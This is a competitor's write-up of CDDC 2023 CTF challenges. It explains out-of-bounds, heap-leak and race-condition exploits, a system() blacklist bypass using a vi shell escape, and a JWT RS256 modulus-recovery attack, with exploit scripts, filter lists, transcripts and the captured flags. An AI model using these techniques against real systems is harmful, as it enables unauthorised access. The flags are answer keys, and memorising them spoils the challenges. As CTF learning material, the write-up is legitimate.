# CDDC 2023 - Writeups

Not all, but some of the interesting challenges of CDDC2023 that I helped solved and learnt something new from.

I played as MilkT with my team GREENHAT (Uni Category) and we placed 11th in the on-site finals.

Overall thoughts:

The training is good to learn for beginners

The qualifiers had a good duration (36 hours) and had challenges of varying difficulties and the standard categories (pwn, rev, web, forensics, misc).

The finals introduced more challenge types like IOT, firmware, chatGPT, radiofrequency and many of the challenges was way harder than the qualifiers, but way too short (6 hours) to be able to attempt all the challenges. There’s a heap pwn challenge which seems interesting, but had no time to attempt it

Still have really long way to go, hope to become a better ctf player and keep learning

# Challenges

---
## CDDC Training

### Good Shop - pwn (100pts)

## CDDC Qualifiers

### Mini_Bleed - pwn (100pts)

### Like_Bot - pwn (250pts) 

## CDDC Finals

### Web_Baby - web, crypto (100pts)

### Lock and Key - misc (100pts)
---

## CDDC Training

### Good Shop - pwn (100pts)

> I love cash <3

nc 3.38.185.151 3283
> 

****************TLDR: Simple oob vulnerability to overwrite variable cash****************

The challenge provides us with the source code.

```python
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define STDIN 0
#define STDOUT 1

char flag[0x50] = {0, };

struct shop
{
    unsigned long long goods[10];
    long long cash;
};
struct shop myshop = {.cash = 2000};

void setup()
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}

int read_int()
{
    char buf[0x10];
    read(STDIN, buf, sizeof(buf) - 1);

    return atoi(buf); 
}

void add_goods()
{
    printf("Select index : ");
    int index = read_int();
    if(index < 0 || index > 10)
    {
        printf("Invalid access\n");
        return;
    }

    printf("Goods's price : ");
    int price = read_int();
    if(price < 0 || price > 1500)
    {
        printf("Invalid access\n");
        return;
    }

    myshop.goods[index] = price;

    printf("Finish\n");
}

void sell_goods()
{
    printf("Select index : ");
    int index = read_int();
    if(index < 0 || index > 10)
    {
        printf("Invalid access\n");
        return;
    }

    if(myshop.goods[index])
    {
        myshop.cash += myshop.goods[index];
        myshop.goods[index] = 0;
        printf("Now you have %lld$\n", myshop.cash);
    }

    else
    {
        printf("No goods in this index\n");
        return;
    }
}

void show_goods()
{
    printf("Select index : ");
    int index = read_int();
    if(index < 0 || index > 10)
    {
        printf("Invalid access\n");
        return;
    }

    if(myshop.goods[index])
        printf("Your goods is %lld$\n", myshop.goods[index]);
}

void menu()
{
    printf("\n1. Add goods\n");
    printf("2. Sell goods\n");
    printf("3. Show goods\n");
    printf("4. Exit\n");
    printf("What you want? : ");
}

int main(void)
{
    setup();
    printf("If you have 1337$, you can get flag!\n");
    printf("Now you have %lld$\n", myshop.cash);

    int select = 0;
    while(1)
    {
        if(myshop.cash == 1337)
        {
            int fd = open("/home/oob/flag", O_RDONLY);
            if(fd < 0)
            {
                printf("[!] File descriptor error\n");
                exit(1);
            }
            unsigned int fsize = lseek(fd, 0, SEEK_END);
            lseek(fd, 0, SEEK_SET);

            read(fd, flag, fsize);
            write(STDOUT, flag, fsize);

            exit(1);
        }

        menu();
        select = read_int();
        switch(select)
        {
            case 1:
                add_goods();
                break;
            
            case 2:
                sell_goods();
                break;
        
            case 3:
                show_goods();
                break;

            case 4:
                printf("Bye :)\n");
                exit(1);

            default:
                printf("Wrong input\n");
                break;
        }
    }
}
```

First, in struct shop you can see assignments of the vars, goods is set as size 10, so it has a index of 0-9

![oob_struct](oob_struct.png)

In each of the codes, the comparisons it goes from if(index < 0 || index > 10) , while at first looks quite normal but is actually a vuln, since index >10 means we can actually input 10, so we can actually access goods[10] even though goods is from index 0 to 9.

We look at the struct again. When we access goods[10] (oob), we are actually accessing cash variable! This is since when you go out of bounds in the array (accessing 10 even though index max is 9), you will be accessing the next piece of memory after the array (which happens to be cash!)

Hence, the POC:

- add a goods[10] and set as 1337 - you are actually writing to variable cash
    - the myshop.goods[index] = price; in add() results in myshop.goods[10] = 1337; which is basically myshop.cash = 1337

```python
┌──(wayell㉿wayell)-[~/…/CDDC2023/Training/CTF/bin]
└─$ nc 3.38.185.151 3283
If you have 1337$, you can get flag!
Now you have 2000$

1. Add goods
2. Sell goods
3. Show goods
4. Exit
What you want? : 1
Select index : 10
Goods's price : 1337
Finish
1db08b64fd16f0a0653772157078f077
```

Pretty simple exploitation! But good to learn about fundementals

Flag: `CDDC2023{1db08b64fd16f0a0653772157078f077}`

---

## CDDC Qualifiers

### Mini_Bleed - pwn (100pts)

> 100 points, did not record challenge description at the time, but something about memory leaks
> 

**TLDR: Flag is scattered randomly throughout the heap in a specific structure. Leak different parts of the flag from the heap through unsanitized user input.**

No source code is provided, only binary file.

```jsx
┌──(kali㉿kali)-[~/cddc/bin]
└─$ file mini_bleed 
mini_bleed: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f2c292ffa19f7c7c0a9364a64649c31a3af73048, for GNU/Linux 3.2.0, with debug_info, not stripped
```

As the binary (for local) reads from /home/ctf/flag, I’ve inserted a placeholder flag for now. Exploiting remotely can use the same method for this challenge.

```jsx
┌──(kali㉿kali)-[~/cddc/bin]
└─$ cat /home/ctf/flag
CDDC2023{th1s_is_f4ke_flag}
```

When running the program, the binary asks us for a length input, and then the data we want to enter. Afterwards, the program will print our output. When playing around with the length, if we write less data than our specified length, it seems as though some bytes from the memory would be leaked when printing. The program also prints out the total length of the flag. (so helpful!)

```jsx
┌──(kali㉿kali)-[~/cddc/bin]
└─$ ./mini_bleed
size : 5
data : hello
flag total len : 28
hello
size : 20
data : hello
flag total len : 28
hello#R�S�l���{E�E
size : 5
data : hellohello
flag total len : 28
hello
```

******Explanation (can skip to Solution if want to see the exploitation instead)******

While the actual exploitation is actually really easy, we can check out how the binary looks in IDA to actually understand what is happening.

**main()**

- First calls rand_memory_alloc()
- Afterwards, calls user_data_input() which from the name, probably takes in our inputs
- Then perform rand_flag() function
- Does `write(1, heap_start, buf_size);` which from the var names, seems to be writing from heap to stdout
- Calls heap_free() and sets buf_size to 0

```jsx
int __fastcall main(int argc, const char **argv, const char **envp)
{
  std_init();
  while ( 1 )
  {
    rand_memory_alloc();
    if ( (unsigned int)user_data_input() )
      return 0;
    rand_flag();
    write(1, heap_start, buf_size);
    putchar(10);
    if ( heap_free() )
      break;
    buf_size = 0LL;
  }
  return 0;
}
```

**rand_memory_alloc()**

- allocates a heap of random size, up to 0x20000 bytes
- the size is then aligned to 0x1000. common practice as it is usually the page size
- heap_alloc() allocates the memory on the heap, then the starting addr of the heap is stored in heap_start
- lastly just some error checking

```jsx
void __fastcall rand_memory_alloc()
{
  int heap_alloc_size; // [rsp+8h] [rbp-8h]

  heap_alloc_size = rand_size(0x20000u);
  alloc_size = align_to_0x1000(heap_alloc_size);
  heap_start = heap_alloc(alloc_size);
  if ( !rand_str_inMemory(alloc_size - 1) )
    exit(1);
}
```

**user_data_input()**

- reads out input, up to 256 bytes for size and 1024 bytes for data
- our input from size is stored eventually as buf_size
- copies our input from data to the start of the heap.

```jsx
__int64 __fastcall user_data_input()
{
  size_t v1; // rax
  uint32_t val; // [rsp+4h] [rbp-51Ch]
  char *endptr; // [rsp+8h] [rbp-518h] BYREF
  char size[256]; // [rsp+10h] [rbp-510h] BYREF
  char buf[1024]; // [rsp+110h] [rbp-410h] BYREF
  unsigned __int64 v6; // [rsp+518h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(size, 0, sizeof(size));
  endptr = 0LL;
  printf("size : ");
  safe_read(size, 0xFFuLL);
  val = strtol(size, &endptr, 10);
  if ( *endptr )
    return 1LL;
  buf_size = val;
  if ( alloc_size < val )
    buf_size = alloc_size;
  printf("data : ");
  safe_read(buf, 0x400uLL);
  v1 = strlen(buf);
  memcpy(heap_start, buf, v1);
  return 0LL;
}
```

**rand_flag()**

- reads flag from /home/ctf/flag
- for the flag, break it into pieces in the following:
    - there will be up to maximum 8+1 pieces of the flag in total (based on `piece = rand_size(8u) + 1`)
    - for each piece, it will be stored in the following format: `[ PIECENUM. <data> ]`
    e.g. first piece is `[ 0. CDDC ]`
    - however, for the last piece, it is also printed in the same format, but without the space after the initial `[` character.
        
        e.g. last piece is `[7. flag} ]`
        why is that so? notice instead of `strcpy(&sig_buf[strlen(sig_buf)], "[ ");` the last block actually is `*(_WORD *)&sig_buf[strlen(sig_buf)] = 91;`
        
    - each piece will be scattered randomly in the heap

```jsx
void __fastcall rand_flag()
{
  size_t v0; // r12
  char *v1; // r13
  size_t v2; // rbx
  size_t v3; // rax
  size_t v4; // r12
  char *v5; // r13
  size_t v6; // rbx
  size_t v7; // rax
  uint32_t buf_len; // [rsp+4h] [rbp-6Ch]
  unsigned int j; // [rsp+8h] [rbp-68h]
  int i; // [rsp+Ch] [rbp-64h]
  uint32_t piece; // [rsp+10h] [rbp-60h]
  int fd; // [rsp+14h] [rbp-5Ch]
  uint32_t read_size; // [rsp+18h] [rbp-58h]
  int piece_len; // [rsp+1Ch] [rbp-54h]
  char *buf; // [rsp+20h] [rbp-50h]
  char *tmp; // [rsp+28h] [rbp-48h]
  char *sig_buf; // [rsp+30h] [rbp-40h]
  char num_str[10]; // [rsp+3Eh] [rbp-32h] BYREF
  unsigned __int64 v19; // [rsp+48h] [rbp-28h]

  v19 = __readfsqword(0x28u);
  buf = (char *)calloc(1uLL, 0x400uLL);
  piece = rand_size(8u) + 1;
  j = 0;
  memset(num_str, 0, sizeof(num_str));
  fd = open("/home/ctf/flag", 0);
  if ( fd == -1 )
  {
    puts("flag open error");
    exit(1);
  }
  read_size = read(fd, buf, 0x3FFuLL);
  if ( read_size != -1 )
    printf("flag total len : %d\n", read_size);
  buf_len = strlen(buf);
  if ( buf[buf_len - 1] == 10 )
    buf[--buf_len] = 0;
  sig_buf = (char *)calloc(1uLL, buf_len + 2);
  tmp = buf;
  for ( i = piece; i > 1; --i )
  {
    piece_len = rand_size(buf_len - i - 1);
    strcpy(&sig_buf[strlen(sig_buf)], "[ ");
    sprintf(num_str, "%d", j++);
    strcat(sig_buf, num_str);
    strcpy(&sig_buf[strlen(sig_buf)], ". : ");
    strncat(sig_buf, buf, piece_len);
    *(_WORD *)&sig_buf[strlen(sig_buf)] = 93;
    v0 = strlen(sig_buf);
    v1 = (char *)heap_start;
    v2 = rand_size(alloc_size);
    v3 = strlen(sig_buf);
    memcpy(&v1[v2 - v3], sig_buf, v0);
    buf += piece_len;
    buf_len -= piece_len;
    memset(sig_buf, 0, buf_len + 2);
  }
  *(_WORD *)&sig_buf[strlen(sig_buf)] = 91;
  sprintf(num_str, "%d", j);
  strcat(sig_buf, num_str);
  strcpy(&sig_buf[strlen(sig_buf)], ". : ");
  strncat(sig_buf, buf, buf_len);
  *(_WORD *)&sig_buf[strlen(sig_buf)] = 93;
  v4 = strlen(sig_buf);
  v5 = (char *)heap_start;
  v6 = rand_size(alloc_size);
  v7 = strlen(sig_buf);
  memcpy(&v5[v6 - v7], sig_buf, v4);
  free(tmp);
  free(sig_buf);
  close(fd);
}
```

****************Solution****************

Now we have some idea to solve this. The flag is split up and placed in the heap randomly. Back in main(), there is a write call to write to the heap: `write(1, heap_start, buf_size);`

Notice that this uses buf_size, which is the parameter we have set as the size, instead of checking against the length of our input in data. This allows us to set our own length to read from the heap!

To solve this, we can use regex to grep out the parts of the flag. Use `-1` as the size to cause an integer overflow and leak the whole heap, and any input as the data.

```jsx
┌──(kali㉿kali)-[~/cddc/bin]
└─$ python3 -c 'print("-1\n1")' | ./mini_bleed | grep -aoe "\[.*[0-9].*\]"
[ 0. : CDDC2023{th1s_is_f4ke]
[2. : ag}]
[ 1. : _fl]
zsh: done                python3 -c 'print("-1\n1")' | 
zsh: segmentation fault  ./mini_bleed | 
zsh: done                grep --color=auto -aoe "\[.*[0-9].*\]"
```

![bleed_flag](bleed_flag.png)

And reconstruct it according to the index, we get the full flag:

```jsx
CDDC2023{th1s_is_f4ke_flag} # didnt actually record down the remote solve and flag, so its local solve for this writeup - same concept to solve remotely
```

---

### Like_Bot - pwn (250pts)

> 250 points, did not record challenge description at the time
> 

******************************************************TLDR: Race condition exploit to system jail bypass******************************************************

No source code is provided, only binary file.

```jsx
┌──(kali㉿kali)-[~/cddc/bin]
└─$ file like_bot 
like_bot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=edd39c15d1aae98aadebc43d5ed670b87ac10a98, for GNU/Linux 3.2.0, stripped
```

Normal program execution, on first run, seems like it is asking for input, but we don’t seem to have the right commands.

```python
┌──(wayell㉿wayell)-[~/…/2023/CDDC2023/ctf/bin]
└─$ ./like_bot 
                  \.===./    
                  | O O |    
                   \_E_/     
                 ,"|+  |".   
                  _\|+__|/_   
                   ]| |[     
                  [_| |_]     

        like: 0          Amanda@sapiens.io
$ hello
...
<REDACTED NEWLINES>
...
default command
$
```

IDA

main:

- sub_1606 print the initial text (the cool art and text in the normal program execution)
- asks for our input, and sub_1817 checks if the input is more than 1023 characters long, if more than, disregards our input
- for our input, the strtok actually splits based on `;` characters. though the output seems to write the maximum commands is 2, but actually the maximum commands is 0x40 (64)
- if all checks passes, goes to sub_1E9A

```python
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  unsigned int v4; // [rsp+8h] [rbp-2028h]
  int j; // [rsp+Ch] [rbp-2024h]
  char *i; // [rsp+10h] [rbp-2020h]
  char *s; // [rsp+18h] [rbp-2018h]
  __int64 v8[1026]; // [rsp+20h] [rbp-2010h] BYREF

  v8[1025] = __readfsqword(0x28u);
  sub_1409(a1, a2, a3);
  memset(v8, 0, 0x2000uLL);
  v4 = 0;
  qword_50E0 = calloc(1uLL, 0x200uLL);
  sub_1606(1LL, 1LL);
  while ( 1 )
  {
    s = (char *)malloc(0x400uLL);
    if ( !s )
      break;
    *(_QWORD *)s = 0LL;
    *((_QWORD *)s + 127) = 0LL;
    memset(
      (void *)((unsigned __int64)(s + 8) & 0xFFFFFFFFFFFFFFF8LL),
      0,
      8LL * ((((_DWORD)s - (((_DWORD)s + 8) & 0xFFFFFFF8) + 1024) & 0xFFFFFFF8) >> 3));
    printf("$ ");
    if ( sub_1817(s, 1024LL) )
    {
      for ( i = strtok(s, ";"); i; i = strtok(0LL, ";") )
        v8[v4++] = (__int64)i;
      if ( v4 <= 0x40 )
        sub_1E9A(v8, v4);
      else
        puts("The maximum number of commands that can be entered is 2");
      for ( j = 0; j <= 1023; ++j )
        v8[j] = 0LL;
      memset(qword_50E0, 0, 0x200uLL);
      v4 = 0;
      free(s);
    }
  }
  return 0LL;
}
```

sub_1E9A:

There’s quite a number of things going on here:

- we can see the commands allowed are actually `create` and `echo`
- `create` increments `qword_50C8` pointer and program goes to the `else if ( *(_DWORD *)qword_50C8 )` block.
    - as we can chain commands with `;`, create actually will create x number of bots: `printf("make %d bot? y/n\n", *(unsigned int *)qword_50C8);`
    - `sub_1817` does some length checking
    - for each bot, a thread will be created running start_routine func: `pthread_create((pthread_t *)qword_50E0 + (int)j, 0LL, start_routine, 0LL);`
- `echo` sets `(_DWORD *)(qword_50C8 + 4) = 1;` and program goes to the `if ( *(_DWORD *)(qword_50C8 + 4) )` block.
    - there are checks for whether `dword_50D8` is equal to `dword_50D4` and increments `dword_50D0` if they are not equal.
    - to jump to `sub_1920`, `dword_50D0` must be more than 0xA (10). this actually means echo must be called at least 10 times with the `if ( dword_50D8 != dword_50D4 )` condition being fulfilled.

```python
unsigned __int64 __fastcall sub_1E9A(__int64 a1, unsigned int a2)
{
  size_t v2; // rax
  unsigned int i; // [rsp+14h] [rbp-2Ch]
  unsigned int j; // [rsp+18h] [rbp-28h]
  unsigned int k; // [rsp+1Ch] [rbp-24h]
  _QWORD *dest; // [rsp+20h] [rbp-20h]
  const char *s1; // [rsp+28h] [rbp-18h]
  __int16 v9; // [rsp+35h] [rbp-Bh] BYREF
  char v10; // [rsp+37h] [rbp-9h]
  unsigned __int64 v11; // [rsp+38h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  sub_15D3();
  v9 = 0;
  v10 = 0;
  if ( a2 )
  {
    if ( qword_50C8 )
    {
      dest = malloc(0x400uLL);
      if ( dest )
      {
        *dest = 0LL;
        dest[127] = 0LL;
        memset(
          (void *)((unsigned __int64)(dest + 1) & 0xFFFFFFFFFFFFFFF8LL),
          0,
          8LL * ((((_DWORD)dest - (((_DWORD)dest + 8) & 0xFFFFFFF8) + 1024) & 0xFFFFFFF8) >> 3));
        for ( i = 0; a2 > i; ++i )
        {
          v2 = strlen(*(const char **)(8LL * (int)i + a1));
          memcpy(dest, *(const void **)(8LL * (int)i + a1), v2);
          s1 = strtok(*(char **)(8LL * (int)i + a1), " ");
          if ( s1 )
          {
            if ( !strcmp(s1, "create") )
              ++*(_DWORD *)qword_50C8;
            if ( !strcmp(s1, "echo") )
            {
              *(_DWORD *)(qword_50C8 + 4) = 1;
              break;
            }
          }
          memset(dest, 0, 0x400uLL);
        }
        if ( *(_DWORD *)(qword_50C8 + 4) )
        {
          sub_1606(1LL, 1LL);
          if ( dword_50D8 != dword_50D4 )
            ++dword_50D0;
          if ( (unsigned int)dword_50D8 > 0xFFFFFC17 || (unsigned int)dword_50D4 > 0xFFFFFC17 )
          {
            dword_50D8 = 0;
            dword_50D4 = 0;
          }
          if ( (unsigned int)dword_50D0 > 0xA )
            sub_1920();
        }
        else if ( *(_DWORD *)qword_50C8 )
        {
          dword_50DC = 0;
          printf("make %d bot? y/n\n", *(unsigned int *)qword_50C8);
          while ( !sub_1817((__int64)&v9, 2uLL) )
          {
            v9 = 0;
            v10 = 0;
          }
          if ( (_BYTE)v9 == 121 )
          {
            for ( j = 0; *(_DWORD *)qword_50C8 > j; ++j )
              pthread_create((pthread_t *)qword_50E0 + (int)j, 0LL, start_routine, 0LL);
            dword_50DC = 1;
            for ( k = 0; *(_DWORD *)qword_50C8 > k; ++k )
              pthread_join(*((_QWORD *)qword_50E0 + (int)k), 0LL);
          }
          v9 = 0;
          v10 = 0;
        }
        else
        {
          puts("default command");
        }
        *(_QWORD *)qword_50C8 = 0LL;
        free(dest);
      }
    }
  }
  return v11 - __readfsqword(0x28u);
}
```

start_routine:

- `sub_18AB` is first called
- the program pausesfor 1s
- only after that 1s, `dword_50D8` is incremented.

```python
void *__fastcall start_routine(void *a1)
{
  while ( !dword_50DC )
    ;
  sub_18AB(a1);
  usleep(1u);
  ++dword_50D8;
  return 0LL;
}
```

sub_18AB:

- `dword_50D4` is incremented before returning

```python
int sub_18AB()
{
  pthread_mutex_lock(&mutex);
  ++dword_50D4;
  return pthread_mutex_unlock(&mutex);
}
```

This gives us a rather good idea on how we can fulfil the earlier `if ( dword_50D8 != dword_50D4 )` condition. If we start multiple threads at the same time by spawning x robots, there is a good chance of a race condition when we run our `echo` as some of the threads may not have completed both `dword_50D8` and `dword_50D4` increments. 

We just need to repeat this successfully 10 times.

Now, we can have a look at sub_1920().

sub_1920():

- prints some text and prompts for our input
- if our input is `CDDC` then proceeds to the next block which executes our next input with system(): `system(dest);`
    - however, the catch is if we bypass all the filters:
        
        "sh"
        "bash"
        "cat"
        ";"
        "*"
        "echo"
        "ls"
        "flag"
        "|"
        "&"
        "$"
        "<"
        ">"
        "bin"
        "/"
        "sbin"
        "\"
        "?"
        "`"
        """
        "("
        ")"
        "-"
        "%"
        "'"
        

```python
unsigned __int64 sub_1920()
{
  size_t v0; // rax
  char s[8]; // [rsp+0h] [rbp-910h] BYREF
  __int64 v3; // [rsp+8h] [rbp-908h]
  __int64 v4; // [rsp+10h] [rbp-900h]
  __int64 v5; // [rsp+18h] [rbp-8F8h]
  __int64 v6; // [rsp+20h] [rbp-8F0h]
  __int64 v7; // [rsp+28h] [rbp-8E8h]
  __int64 v8; // [rsp+30h] [rbp-8E0h]
  __int64 v9; // [rsp+38h] [rbp-8D8h]
  __int64 v10; // [rsp+40h] [rbp-8D0h]
  __int64 v11; // [rsp+48h] [rbp-8C8h]
  __int64 v12; // [rsp+50h] [rbp-8C0h]
  __int64 v13; // [rsp+58h] [rbp-8B8h]
  __int64 v14; // [rsp+60h] [rbp-8B0h]
  __int64 v15; // [rsp+68h] [rbp-8A8h]
  __int64 v16; // [rsp+70h] [rbp-8A0h]
  __int64 v17; // [rsp+78h] [rbp-898h]
  __int64 v18; // [rsp+80h] [rbp-890h]
  __int64 v19; // [rsp+88h] [rbp-888h]
  __int64 v20; // [rsp+90h] [rbp-880h]
  __int64 v21; // [rsp+98h] [rbp-878h]
  __int64 v22; // [rsp+A0h] [rbp-870h]
  __int64 v23; // [rsp+A8h] [rbp-868h]
  __int64 v24; // [rsp+B0h] [rbp-860h]
  __int64 v25; // [rsp+B8h] [rbp-858h]
  __int64 v26; // [rsp+C0h] [rbp-850h]
  __int64 v27; // [rsp+C8h] [rbp-848h]
  __int64 v28; // [rsp+D0h] [rbp-840h]
  __int64 v29; // [rsp+D8h] [rbp-838h]
  __int64 v30; // [rsp+E0h] [rbp-830h]
  __int64 v31; // [rsp+E8h] [rbp-828h]
  __int64 v32; // [rsp+F0h] [rbp-820h]
  __int64 v33; // [rsp+F8h] [rbp-818h]
  char buf[1024]; // [rsp+100h] [rbp-810h] BYREF
  char dest[1032]; // [rsp+500h] [rbp-410h] BYREF
  unsigned __int64 v36; // [rsp+908h] [rbp-8h]

  v36 = __readfsqword(0x28u);
  *(_QWORD *)s = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = 0LL;
  v15 = 0LL;
  v16 = 0LL;
  v17 = 0LL;
  v18 = 0LL;
  v19 = 0LL;
  v20 = 0LL;
  v21 = 0LL;
  v22 = 0LL;
  v23 = 0LL;
  v24 = 0LL;
  v25 = 0LL;
  v26 = 0LL;
  v27 = 0LL;
  v28 = 0LL;
  v29 = 0LL;
  v30 = 0LL;
  v31 = 0LL;
  v32 = 0LL;
  v33 = 0LL;
  puts("Warning!!Warning!! discovery of suspicious activity!!!");
  puts("it's the police!!\nwho are you??");
  read(0, buf, 0x3FFuLL);
  if ( strstr(buf, "CDDC") )
  {
    printf("you are precious!!\nhow can i help you?");
    read(0, s, 0xFFuLL);
    v0 = strlen(s);
    memcpy(dest, s, v0);
    if ( strstr(s, "sh")
      || strstr(s, "bash")
      || strstr(s, "cat")
      || strchr(s, 59)
      || strchr(s, 42)
      || strstr(s, "echo")
      || strstr(s, "ls")
      || strstr(s, "flag")
      || strchr(s, 124)
      || strchr(s, 38)
      || strchr(s, 36)
      || strchr(s, 60)
      || strchr(s, 62)
      || strstr(s, "bin")
      || strchr(s, 47)
      || strstr(s, "sbin")
      || strchr(s, 92)
      || strchr(s, 63)
      || strchr(s, 96)
      || strchr(s, 34)
      || strchr(s, 40)
      || strchr(s, 41)
      || strchr(s, 45)
      || strchr(s, 37)
      || strchr(s, 39) )
    {
      puts("Invalid command");
    }
    else
    {
      system(dest);
    }
  }
  else
  {
    puts("You're a bad person. I'll arrest you.");
    dword_50D4 = 0;
    dword_50D8 = 0;
    dword_50D0 = 0;
  }
  return v36 - __readfsqword(0x28u);
}
```

This seems like a simple blacklist for a system() jail.

We have the pieces to craft our exploit:

(this is a very scuffed implementation, but i came up with this at the time)

```python
from pwn import *
#p = process("./like_bot")
p = remote("challenges.pwn.cddc2023.com", 5559)

for i in range(20):
        data = p.recv()
        if b'who are you??' in data:
                p.send("CDDC")
                p.interactive()
        print(data)
        p.send("create;CDDC;create;CDDC;"*10+"\n")
        data = p.recv()
        if b'who are you??' in data:
                p.send("CDDC")
                p.interactive()
        print(data)
        p.send("y\n")
        data = p.recv()
        if b'who are you??' in data:
                p.send("CDDC")
                p.interactive()
        print(data)
        p.send("echo\n")
p.interactive()
```

Running the exploit, we can actually get RCE via system.

![likebot_rce](likebot_rce.png)

Afterwards, just do a simple vi trick to spawn a shell, and get the flag from the remote directory. (didn’t screenshot or keep console logs :( sadly)

```python
vi
:set shell=/bin/bash
:shell
```

Flag: `CDDC2023{Isnt_it_cust0mary_to_hit_the_like_butt0n_as_y0u_go}`

---

## CDDC Finals

### Web_Baby - web, crypto (100pts)

> publicKey was given to everyone.
Can you be an admin on our company’s homepage?
> 

****************************TLDR: Recovery of public key from two RS256 JWTs, factordb attack to recover private key, and tamper JWT to get admin auth****************************

**Solution - Using past writeups, already available tools**

From testing the application, we get a newly generated JWT token every time we login with `guest:guest`

![webbaby_login](webbaby_login.png)

As the challenge suggests, we tried looking for the publickey for the jwt on the site (fuzzing, etc) but to no avail.

JWT follows a message signature pair. The JWT token uses the RS256 algorithm, which is basically RSA using SHA256. The private key is used to sign and the public key is used to verify. In message signature pairs, it is possible to recover the RSA modulus N from two known message signature pairs.

This github repository contains such a POC: https://github.com/silentsignal/rsa_sign2n

Also, past CTF writeups also have solved such problems: [https://ctftime.org/writeup/26173](https://ctftime.org/writeup/26173)

With modulus N, we can actually recover the public key as it consists of N and e

We can use the same codes in the cr0wnair ctftime writeup, using two JWTs which we obtain from the server by logging in twice.

- also related:
[https://crypto.stackexchange.com/questions/26188/rsa-public-key-recovery-from-signatures](https://crypto.stackexchange.com/questions/26188/rsa-public-key-recovery-from-signatures)
[https://crypto.stackexchange.com/questions/30289/is-it-possible-to-recover-an-rsa-modulus-from-its-signatures/30301#30301](https://crypto.stackexchange.com/questions/30289/is-it-possible-to-recover-an-rsa-modulus-from-its-signatures/30301#30301)

```python
from base64 import urlsafe_b64decode
from Crypto.Util.number import bytes_to_long, long_to_bytes
import gmpy2

def get_magic(jwt):
    header, payload, signature = jwt.split(".")

    raw_signature = urlsafe_b64decode(f"{signature}==")
    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature))

    # In RS256 we sign the base64 encoded header and payload padded using PKCS1 v1.5:
    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature))
    padded_int = gmpy2.mpz(bytes_to_long(padded_msg))

    return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)

from hashlib import sha256

def pkcs1_v1_5_encode(msg: bytes, n_len: int):
    SHA256_Digest_Info = b'\x30\x31\x30\x0D\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
    T = SHA256_Digest_Info + sha256(msg).digest()
    PS = b'\xFF' * (n_len - len(T) - 3)
    return b'\x00\x01' + PS + b'\x00' + T

jwt0="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJBVVRIIjoxLCJpYXQiOjE2ODc0MTQ4MDh9.ZgYIWfwIdzWfot6N6_A0r0zA395_n40Wjrx9B37W5GJj1UbRrP_G8e6QZlbWiPzuoKGIAIkyoTuXeaoKGdJquMAgpQbySukdKj49xhpiFC_CzpFchMrtYIWjeobPPsxGIF4AbLjBZADxSQ0tRnzdCHFZdYTpy_nlUac-65f8pWLQGV2SBgFLTLv3bBYwQvwdZ-Rk70kTjV9Jskg0taGgCpn9RnEiCAc6mJLjONLPS3rZP_BwU0JG3BYYDGdzresS6T4WbIvYr2Rs9vt3C78JAyeU9WBUgAnArbVIhAy2Am167UWa97gf9hRJNllCMz69UsHnzaCW4RI4OTNPUtRnnA"
jwt1="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJBVVRIIjoxLCJpYXQiOjE2ODc0MTQ4MjZ9.nWredGUP9-UsCJHpp7D5KQGvJ8c1pnG6iBr0j253mQgDAw2Uz9wUmcWQhQKZsFYq4maVmjqFtGpYEKGgEjAOPT08HxOKFtz-zbQy5AYBxxVP2_18SBd9hZr_GXud_72EcLeWEFFPnS4bAV3Zk7lJSW8Mp00BIuPrzqKVM4WFmiz1uBNh6BKF4EhpKkTobSAfZfzmtqLOxbSi8hZ6pB5sPmIW6aUX54PK4whb4OOxjOJGjn4JRipv6BETcBSgJypPC6vQK7RsbTnxyhZIb6u371oiT5K5HTG6hjgYcTo66E61EpBaYxRUq0KEFdpp32JOAWxcs4Vp6a_Jf4tVjwrqcA"

e = gmpy2.mpz(65537)

magic0 = get_magic(jwt0)
magic1 = get_magic(jwt1)
# ^ Check the number of digits: len(str(magic0)) == 40_392_410  :O

N = gmpy2.gcd(magic0, magic1)
assert N != 1
# ^ This takes a minute or two
print(hex(N))
```

We get N. 

```python
┌──(wayell㉿wayell)-[~/…/CTF/2023/CDDC2023/finals]
└─$ python3 jwt.py           
0xc7d10bf4481373dbc4f359d813cf8ef181114610598247e460076c465a32952b6f0fe730657021c658ddfd7599b5c84e3a6564cefcd5682024f3b66bb673350254c543dc9c8d3e50790fe96e54fc59e4f9ca08b5ab557bb03ec077bad24bedd6d096bda98902eeabec11b161d27a519c3a2e3e96fa241664f4713f5fb2e99f60ac1bbdec2d4eecb15892dac5edc2947f9329dee5c71878762d9ad75374ba3e1f88097c91da44a113a6192a4bab67deb242d8de5ccf3f40b023f50ab0dc190404708e266ed8661734d8f356c5c9b2ca1d7a58395a230aa8a0a7aeed8a943b451f4a716bee6e85c01cf1ece7aa15a8cf708c5914a3ae68898d5159d87987c41d77
```

With N, we can calculate the private key as long as exponent e is known, but common e tends to be 65537, 3, 5, 17.

The same writeup also demonstrates how to reconstruct the public key, using e=65537 (aka 0x010001)

```python
┌──(wayell㉿wayell)-[~/…/CTF/2023/CDDC2023/finals]
└─$ openssl asn1parse -genconf def.asn1 -out pubkey.der
    0:d=0  hl=4 l= 290 cons: SEQUENCE          
    4:d=1  hl=2 l=  13 cons: SEQUENCE          
    6:d=2  hl=2 l=   9 prim: OBJECT            :rsaEncryption
   17:d=2  hl=2 l=   0 prim: NULL              
   19:d=1  hl=4 l= 271 prim: BIT STRING        
